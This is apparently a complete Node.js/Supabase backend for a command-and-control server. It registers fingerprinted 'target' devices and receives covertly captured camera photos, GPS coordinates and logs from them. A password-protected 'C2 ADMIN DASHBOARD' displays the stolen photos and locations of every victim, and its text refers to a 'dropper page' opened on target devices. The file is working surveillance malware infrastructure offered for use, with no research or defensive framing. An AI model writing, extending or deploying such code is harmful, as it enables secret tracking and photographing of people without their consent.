// ============================================================
//  SINGLE ENTRY POINT — ALL ROUTES IN ONE FILE
//  WITH FULL DEBUG LOGGING
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

console.log('[Boot] SUPABASE_URL:', supabaseUrl ? '✅ set' : '❌ missing');
console.log('[Boot] SUPABASE_KEY:', supabaseKey ? '✅ set' : '❌ missing');

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
    console.log('[Boot] Supabase client initialized.');
} else {
    console.log('[Boot] Supabase client NOT initialized — missing credentials.');
}

// ============================================================
//  PASSWORD CONFIG
// ============================================================
const DASHBOARD_PASSWORD = 'infected';

// ============================================================
//  CORS HELPERS
// ============================================================
function setCors(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

function handleOptions(req, res) {
    if (req.method === 'OPTIONS') {
        setCors(res);
        res.status(200).end();
        return true;
    }
    return false;
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    setCors(res);

    // Handle preflight
    if (handleOptions(req, res)) return;

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;

    console.log(`[Route] ${req.method} ${path}`);

    // ============================================================
    //  ROUTE: /api/register
    // ============================================================
    if (path === '/api/register' && req.method === 'POST') {
        console.log('[Register] Received registration request');
        const { fingerprint, permissions } = req.body || {};
        if (!fingerprint) {
            console.log('[Register] Error: Missing fingerprint');
            return res.status(400).json({ error: 'Missing fingerprint' });
        }
        if (!supabase) {
            console.log('[Register] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        console.log('[Register] Device ID:', deviceId);

        const { data, error } = await supabase
            .from('devices')
            .insert([{
                id: deviceId,
                ip: fingerprint.ip || 'unknown',
                platform: fingerprint.platform || 'unknown',
                screen: fingerprint.screen || 'unknown',
                timezone: fingerprint.timezone || 'unknown',
                cpu_cores: fingerprint.cpuCores || 'unknown',
                memory: fingerprint.deviceMemory || 'unknown',
                canvas_fp: fingerprint.canvasFingerprint || 'unknown',
                first_seen: Date.now(),
                last_seen: Date.now(),
                permissions: JSON.stringify(permissions || {})
            }])
            .select();

        if (error) {
            console.error('[Register] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }
        console.log('[Register] Success:', deviceId);
        return res.json({ success: true, deviceId });
    }

    // ============================================================
    //  ROUTE: /api/photo
    // ============================================================
    if (path === '/api/photo' && req.method === 'POST') {
        console.log('[Photo] Received photo upload request');
        const { deviceId, image, timestamp } = req.body || {};
        if (!deviceId || !image) {
            console.log('[Photo] Error: Missing deviceId or image');
            return res.status(400).json({ error: 'Missing deviceId or image' });
        }
        if (!supabase) {
            console.log('[Photo] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        try {
            const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
            const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
            const fileName = `${deviceId}_${Date.now()}.${ext}`;
            const fileBuffer = Buffer.from(base64Data, 'base64');

            console.log('[Photo] File:', fileName, 'Size:', fileBuffer.length);

            let storagePath = null;
            let publicUrl = null;

            // Try to upload to Supabase Storage
            try {
                const { data: uploadData, error: uploadError } = await supabase
                    .storage
                    .from('photos')
                    .upload(fileName, fileBuffer, {
                        contentType: `image/${ext}`,
                        cacheControl: '3600'
                    });

                if (!uploadError) {
                    storagePath = fileName;
                    const { data: urlData } = supabase.storage.from('photos').getPublicUrl(fileName);
                    publicUrl = urlData?.publicUrl || null;
                    console.log('[Photo] Uploaded to storage:', storagePath);
                } else {
                    console.error('[Photo] Storage upload error:', uploadError);
                }
            } catch (storageErr) {
                console.error('[Photo] Storage exception:', storageErr);
            }

            // Always save to DB (with or without storage)
            const { error: dbError } = await supabase
                .from('photos')
                .insert([{
                    device_id: deviceId,
                    timestamp: timestamp || Date.now(),
                    data_url: storagePath ? null : image.substring(0, 100) + '...',
                    file_path: null,
                    storage_path: storagePath
                }]);

            if (dbError) {
                console.error('[Photo] DB insert error:', dbError);
                throw dbError;
            }

            console.log('[Photo] DB insert success');

            // Update last_seen
            await supabase
                .from('devices')
                .update({ last_seen: Date.now() })
                .eq('id', deviceId);

            return res.json({ success: true, storagePath, publicUrl });
        } catch (e) {
            console.error('[Photo] Fatal error:', e);
            return res.status(500).json({ success: false, error: e.message });
        }
    }

    // ============================================================
    //  ROUTE: /api/log
    // ============================================================
    if (path === '/api/log' && req.method === 'POST') {
        console.log('[Log] Received log request');
        const { deviceId, msg, level } = req.body || {};
        if (!deviceId) {
            console.log('[Log] Error: Missing deviceId');
            return res.status(400).json({ error: 'Missing deviceId' });
        }
        if (!supabase) {
            console.log('[Log] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { error } = await supabase
            .from('logs')
            .insert([{
                device_id: deviceId,
                timestamp: Date.now(),
                level: level || 'info',
                message: msg || ''
            }]);

        if (error) {
            console.error('[Log] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }
        console.log('[Log] Success');
        return res.json({ success: true });
    }

    // ============================================================
    //  ROUTE: /api/location
    // ============================================================
    if (path === '/api/location' && req.method === 'POST') {
        console.log('[Location] Received location request');
        const { deviceId, lat, lon, timestamp } = req.body || {};
        if (!deviceId || lat === undefined || lon === undefined) {
            console.log('[Location] Error: Missing fields');
            return res.status(400).json({ error: 'Missing fields' });
        }
        if (!supabase) {
            console.log('[Location] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { error } = await supabase
            .from('locations')
            .insert([{
                device_id: deviceId,
                timestamp: timestamp || Date.now(),
                lat: lat,
                lon: lon
            }]);

        if (error) {
            console.error('[Location] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }

        await supabase
            .from('devices')
            .update({ last_seen: Date.now() })
            .eq('id', deviceId);

        console.log('[Location] Success');
        return res.json({ success: true });
    }

    // ============================================================
    //  ROUTE: /api/heartbeat
    // ============================================================
    if (path === '/api/heartbeat' && req.method === 'POST') {
        const { deviceId, timestamp } = req.body || {};
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId' });
        }
        if (!supabase) {
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { error } = await supabase
            .from('heartbeats')
            .insert([{
                device_id: deviceId,
                timestamp: timestamp || Date.now()
            }]);

        if (error) {
            console.error('[Heartbeat] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }

        await supabase
            .from('devices')
            .update({ last_seen: Date.now() })
            .eq('id', deviceId);

        return res.json({ success: true });
    }

    // ============================================================
    //  ROUTE: /api/devices (GET)
    // ============================================================
    if (path === '/api/devices' && req.method === 'GET') {
        console.log('[Devices] Fetching all devices');
        if (!supabase) {
            console.log('[Devices] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('first_seen', { ascending: false });

        if (error) {
            console.error('[Devices] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }
        console.log('[Devices] Found:', data ? data.length : 0);
        return res.json(data || []);
    }

    // ============================================================
    //  ROUTE: /api/photos (GET)
    // ============================================================
    if (path === '/api/photos' && req.method === 'GET') {
        const deviceId = url.searchParams.get('deviceId');
        console.log('[Photos] Fetching for device:', deviceId);
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId query param' });
        }
        if (!supabase) {
            console.log('[Photos] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { data, error } = await supabase
            .from('photos')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false });

        if (error) {
            console.error('[Photos] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }

        // Add public URLs
        const result = await Promise.all((data || []).map(async (p) => {
            if (p.storage_path) {
                const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path);
                return { ...p, publicUrl: urlData?.publicUrl || null };
            }
            return p;
        }));

        console.log('[Photos] Found:', result.length);
        return res.json(result);
    }

    // ============================================================
    //  ROUTE: /api/logs (GET)
    // ============================================================
    if (path === '/api/logs' && req.method === 'GET') {
        const deviceId = url.searchParams.get('deviceId');
        console.log('[Logs] Fetching for device:', deviceId);
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId query param' });
        }
        if (!supabase) {
            console.log('[Logs] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { data, error } = await supabase
            .from('logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .limit(200);

        if (error) {
            console.error('[Logs] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }
        console.log('[Logs] Found:', data ? data.length : 0);
        return res.json(data || []);
    }

    // ============================================================
    //  ROUTE: /api/locations (GET)
    // ============================================================
    if (path === '/api/locations' && req.method === 'GET') {
        const deviceId = url.searchParams.get('deviceId');
        console.log('[Locations] Fetching for device:', deviceId);
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId query param' });
        }
        if (!supabase) {
            console.log('[Locations] Error: Supabase not configured');
            return res.status(500).json({ error: 'Supabase not configured' });
        }

        const { data, error } = await supabase
            .from('locations')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .limit(100);

        if (error) {
            console.error('[Locations] Supabase error:', error);
            return res.status(500).json({ error: error.message });
        }
        console.log('[Locations] Found:', data ? data.length : 0);
        return res.json(data || []);
    }

    // ============================================================
    //  ROUTE: /api/logout
    // ============================================================
    if (path === '/api/logout') {
        console.log('[Logout] Logging out');
        res.setHeader('Set-Cookie', 'dashboard_auth=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax');
        res.setHeader('Location', '/api/dashboard');
        return res.status(302).send();
    }

    // ============================================================
    //  ROUTE: /api/test
    // ============================================================
    if (path === '/api/test') {
        console.log('[Test] Health check');
        // Try a simple Supabase query to test connection
        let supabaseStatus = 'not tested';
        let tablesExist = false;
        try {
            if (supabase) {
                const { data, error } = await supabase.from('devices').select('count', { count: 'exact', head: true });
                if (!error) {
                    supabaseStatus = '✅ connected';
                    tablesExist = true;
                } else {
                    supabaseStatus = '❌ error: ' + error.message;
                }
            } else {
                supabaseStatus = '❌ not configured';
            }
        } catch (e) {
            supabaseStatus = '❌ exception: ' + e.message;
        }

        return res.json({
            success: true,
            supabase: supabaseStatus,
            tablesExist: tablesExist,
            supabaseUrl: supabaseUrl ? '✅ set' : '❌ missing',
            supabaseKey: supabaseKey ? '✅ set' : '❌ missing',
            timestamp: new Date().toISOString(),
            routes: [
                '/api/register (POST)',
                '/api/photo (POST)',
                '/api/log (POST)',
                '/api/location (POST)',
                '/api/heartbeat (POST)',
                '/api/devices (GET)',
                '/api/photos (GET?deviceId=xxx)',
                '/api/logs (GET?deviceId=xxx)',
                '/api/locations (GET?deviceId=xxx)',
                '/api/dashboard (GET)',
                '/api/logout (GET)',
                '/api/test (GET)'
            ]
        });
    }

    // ============================================================
    //  ROUTE: /api/dashboard — PASSWORD PROTECTED
    // ============================================================
    if (path === '/api/dashboard') {
        // Check auth cookie
        const cookies = req.headers.cookie || '';
        const authCookie = cookies.split(';').find(c => c.trim().startsWith('dashboard_auth='));
        const isAuthenticated = authCookie && authCookie.split('=')[1] === 'true';

        // Handle POST login
        if (req.method === 'POST') {
            const { password } = req.body || {};
            console.log('[Dashboard] Login attempt');
            if (password === DASHBOARD_PASSWORD) {
                console.log('[Dashboard] Login success');
                res.setHeader('Set-Cookie', `dashboard_auth=true; Max-Age=86400; Path=/; HttpOnly; SameSite=Lax`);
                res.setHeader('Location', '/api/dashboard');
                return res.status(302).send();
            } else {
                console.log('[Dashboard] Login failed');
                res.setHeader('Location', '/api/dashboard?error=1');
                return res.status(302).send();
            }
        }

        // Show login page if not authenticated
        if (!isAuthenticated) {
            return res.send(`<!DOCTYPE html>
<html>
<head><title>Admin Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:40px 36px;max-width:400px;width:100%;border:1px solid #2e2e4a;text-align:center}
.lock-icon{font-size:56px;display:block;margin-bottom:10px}
h2{font-size:24px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
.sub{color:#aab;font-size:14px;line-height:1.6;margin-bottom:20px}
input{width:100%;padding:14px 18px;border-radius:60px;border:1px solid #2a2a44;background:#0b0b14;color:#e0e0e0;font-size:16px;text-align:center;letter-spacing:2px;outline:none;transition:.2s}
input:focus{border-color:#f7971e}
.btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:16px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;width:100%;cursor:pointer;margin-top:14px;transition:all .25s}
.btn:hover{transform:scale(1.02)}
.btn:active{transform:scale(0.96)}
.error-msg{color:#ff5e5e;font-size:13px;min-height:24px;margin-top:10px}
.note{font-size:11px;color:#4a4a6a;margin-top:16px}
</style>
</head>
<body>
<div class="card">
    <span class="lock-icon">🔒</span>
    <h2>Admin Access</h2>
    <p class="sub">Enter the password to view the C2 dashboard.</p>
    <form method="POST" action="/api/dashboard">
        <input type="password" id="passwordInput" name="password" placeholder="Enter password" autofocus />
        <button type="submit" class="btn">Unlock Dashboard</button>
        <div class="error-msg" id="errorMsg"></div>
    </form>
    <p class="note">🔐 This dashboard is password protected.</p>
</div>
<script>
    const params = new URLSearchParams(window.location.search);
    if (params.get('error') === '1') {
        document.getElementById('errorMsg').textContent = '❌ Incorrect password. Try again.';
        document.getElementById('passwordInput').value = '';
        document.getElementById('passwordInput').focus();
    }
</script>
</body>
</html>`);
        }

        // ============================================================
        //  AUTHENTICATED — RENDER DASHBOARD
        // ============================================================
        return res.send(`<!DOCTYPE html>
<html>
<head><title>C2 Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:20px}
h1{color:#f7971e;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
.logout-btn{background:#2a2a44;border:none;padding:8px 18px;border-radius:60px;color:#e0e0e0;font-weight:600;cursor:pointer;font-size:13px;text-decoration:none}
.logout-btn:hover{background:#3a3a5a}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
.card{background:#1a1a2e;border-radius:16px;padding:16px;border:1px solid #2a2a44}
.card h3{color:#88ccff;margin-bottom:6px}
.card .info{font-size:13px;color:#aab;line-height:1.6}
.card .info .label{color:#4a6a7a}
.btn{background:#f7971e;border:none;padding:6px 14px;border-radius:30px;color:#0a0a12;font-weight:600;cursor:pointer;margin-top:6px;font-size:12px}
.btn:hover{transform:scale(1.02)}
.btn-secondary{background:#2a2a44;color:#e0e0e0}
.btn-secondary:hover{background:#3a3a5a}
.log-area{background:#0b0b14;border-radius:12px;padding:8px;max-height:120px;overflow-y:auto;font-size:10px;line-height:1.5;border:1px solid #1a1a2a;margin-top:6px;font-family:'Courier New',monospace}
.log-entry{border-bottom:1px solid #0f0f1a;padding:2px 0}
.log-entry .time{color:#4a6a7a;margin-right:6px}
.log-entry .lvl-info{color:#88ccff}
.log-entry .lvl-warn{color:#ffaa44}
.log-entry .lvl-error{color:#ff5e5e}
.log-entry .lvl-success{color:#6fcf97}
.refresh-btn{background:#2a2a44;border:none;padding:8px 20px;border-radius:60px;color:#e0e0e0;font-weight:600;cursor:pointer;margin-bottom:12px}
.refresh-btn:hover{background:#3a3a5a}
.stat-bar{display:flex;gap:20px;flex-wrap:wrap;background:#1a1a2e;padding:12px 20px;border-radius:60px;margin-bottom:16px;border:1px solid #2a2a44;font-size:14px}
.stat-bar .stat .num{color:#f7971e;font-weight:700;font-size:18px}
.error-box{background:#2a1a1a;border:1px solid #ff5e5e;border-radius:12px;padding:16px;color:#ff5e5e;margin-bottom:16px}
.loading{color:#88ccff;font-size:16px}
.header-actions{display:flex;gap:12px;align-items:center}
.password-badge{background:#1a2a1a;color:#6fcf97;padding:4px 14px;border-radius:60px;font-size:12px;border:1px solid #2a4a2a}
.photo-grid{display:flex;gap:6px;flex-wrap:wrap;margin-top:6px}
.photo-grid img{width:80px;height:80px;object-fit:cover;border-radius:8px;border:1px solid #2a2a44;cursor:pointer}
.photo-grid img:hover{transform:scale(1.05)}
.loc-list{font-size:12px;color:#aab;margin-top:4px}
.loc-list .loc-entry{padding:2px 0;border-bottom:1px solid #0f0f1a}
</style>
</head>
<body>
<h1><span>☠️ C2 ADMIN DASHBOARD</span><div class="header-actions"><span class="password-badge">🔐 Protected</span><a href="/api/logout" class="logout-btn">🚪 Logout</a></div></h1>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;">
    <button class="refresh-btn" onclick="loadDevices()">🔄 Refresh</button>
    <span style="color:#4a6a7a;align-self:center;font-size:13px;">Auto-refreshes every 15s</span>
</div>
<div class="stat-bar" id="statBar">
    <div class="stat">📱 Devices: <span class="num" id="statDevices">0</span></div>
    <div class="stat">📸 Photos: <span class="num" id="statPhotos">0</span></div>
    <div class="stat">📍 Locations: <span class="num" id="statLocations">0</span></div>
    <div class="stat">📋 Logs: <span class="num" id="statLogs">0</span></div>
</div>
<div id="devices" class="grid"><div class="loading">⏳ Loading devices...</div></div>
<script>
const BACKEND_URL = 'https://c2-vercel-backend.vercel.app';
async function fetchJSON(url) {
    try { const r=await fetch(url); if(!r.ok)throw new Error(r.status+' '+r.statusText); return await r.json(); }
    catch(e){ console.error('Fetch error:',e); return null; }
}
async function loadDevices() {
    const container=document.getElementById('devices');
    container.innerHTML='<div class="loading">⏳ Loading...</div>';
    try {
        const devices=await fetchJSON(BACKEND_URL+'/api/devices');
        if(!devices||devices.length===0){ container.innerHTML='<div class="error-box">⚠️ No devices registered yet. Open the dropper page on a target device.</div>'; document.getElementById('statDevices').textContent='0'; return; }
        let totalPhotos=0,totalLogs=0,totalLocations=0;
        container.innerHTML='';
        for(const d of devices){
            const [photos, logs, locations]=await Promise.all([
                fetchJSON(BACKEND_URL+'/api/photos?deviceId='+encodeURIComponent(d.id)),
                fetchJSON(BACKEND_URL+'/api/logs?deviceId='+encodeURIComponent(d.id)),
                fetchJSON(BACKEND_URL+'/api/locations?deviceId='+encodeURIComponent(d.id))
            ]);
            const photoCount=photos?photos.length:0, logCount=logs?logs.length:0, locCount=locations?locations.length:0;
            totalPhotos+=photoCount; totalLogs+=logCount; totalLocations+=locCount;
            let photoHtml='<div class="photo-grid">';
            if(photoCount===0) photoHtml+='<span style="color:#4a6a7a;font-size:11px;">No photos</span>';
            else { photos.slice(0,8).forEach(p=>{ let imgUrl=''; if(p.publicUrl)imgUrl=p.publicUrl; else if(p.storage_path)imgUrl=BACKEND_URL+'/api/photo-file/'+p.storage_path; else if(p.data_url&&p.data_url.startsWith('data:image'))imgUrl=p.data_url; if(imgUrl)photoHtml+='<img src="'+imgUrl+'" alt="photo" onclick="window.open(\''+imgUrl+'\')" />'; }); if(photoCount>8)photoHtml+='<span style="color:#4a6a7a;font-size:11px;display:flex;align-items:center;">+${photoCount-8} more</span>'; }
            photoHtml+='</div>';
            let logHtml='<div class="log-area">';
            if(logCount===0) logHtml+='<span style="color:#4a6a7a;">No logs</span>';
            else { logs.slice(0,10).forEach(l=>{ logHtml+='<div class="log-entry"><span class="time">'+new Date(l.timestamp).toLocaleTimeString()+'</span><span class="lvl-'+ (l.level||'info')+'">'+(l.message||'')+'</span></div>'; }); if(logCount>10)logHtml+='<div style="color:#4a6a7a;font-size:10px;">+'+ (logCount-10)+' more</div>'; }
            logHtml+='</div>';
            let locHtml='<div class="loc-list">';
            if(locCount===0) locHtml+='<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
            else { locations.slice(0,5).forEach(l=>{ locHtml+='<div class="loc-entry">📍 '+l.lat+', '+l.lon+' <span style="color:#4a6a7a;font-size:10px;">'+new Date(l.timestamp).toLocaleTimeString()+'</span></div>'; }); if(locCount>5)locHtml+='<div style="color:#4a6a7a;font-size:10px;">+'+ (locCount-5)+' more</div>'; }
            locHtml+='</div>';
            const card=document.createElement('div'); card.className='card';
            card.innerHTML='<h3>'+(d.ip||'Unknown IP')+'</h3><div class="info"><div><span class="label">Device:</span> '+(d.platform||'Unknown')+'</div><div><span class="label">Screen:</span> '+(d.screen||'Unknown')+'</div><div><span class="label">First seen:</span> '+new Date(d.first_seen).toLocaleString()+'</div><div><span class="label">Last seen:</span> '+new Date(d.last_seen).toLocaleString()+'</div><div><span class="label">📸 Photos:</span> '+photoCount+' &nbsp;|&nbsp; <span class="label">📋 Logs:</span> '+logCount+' &nbsp;|&nbsp; <span class="label">📍 Locations:</span> '+locCount+'</div></div><div style="margin-top:8px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📸 Photos ('+photoCount+')</span></div>'+photoHtml+'</div><div style="margin-top:10px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📋 Logs ('+logCount+')</span></div>'+logHtml+'</div><div style="margin-top:10px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📍 Locations ('+locCount+')</span></div>'+locHtml+'</div><div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;"><button class="btn" onclick="window.open(BACKEND_URL+'/api/photos?deviceId='+encodeURIComponent("'+d.id+'"))">📸 All Photos</button><button class="btn btn-secondary" onclick="window.open(BACKEND_URL+'/api/logs?deviceId='+encodeURIComponent("'+d.id+'"))">📋 All Logs</button><button class="btn btn-secondary" onclick="window.open(BACKEND_URL+'/api/locations?deviceId='+encodeURIComponent("'+d.id+'"))">📍 All Locations</button></div>';
            container.appendChild(card);
        }
        document.getElementById('statDevices').textContent=devices.length;
        document.getElementById('statPhotos').textContent=totalPhotos;
        document.getElementById('statLogs').textContent=totalLogs;
        document.getElementById('statLocations').textContent=totalLocations;
    } catch(err){ container.innerHTML='<div class="error-box">❌ Error: '+err.message+'</div>'; console.error(err); }
}
loadDevices(); setInterval(loadDevices,15000);
</script>
</body>
</html>`);
    }

    // ============================================================
    //  ROUTE: / — redirect to dashboard
    // ============================================================
    if (path === '/') {
        res.setHeader('Location', '/api/dashboard');
        return res.status(302).send();
    }

    // ============================================================
    //  404 — NOT FOUND
    // =========================================================
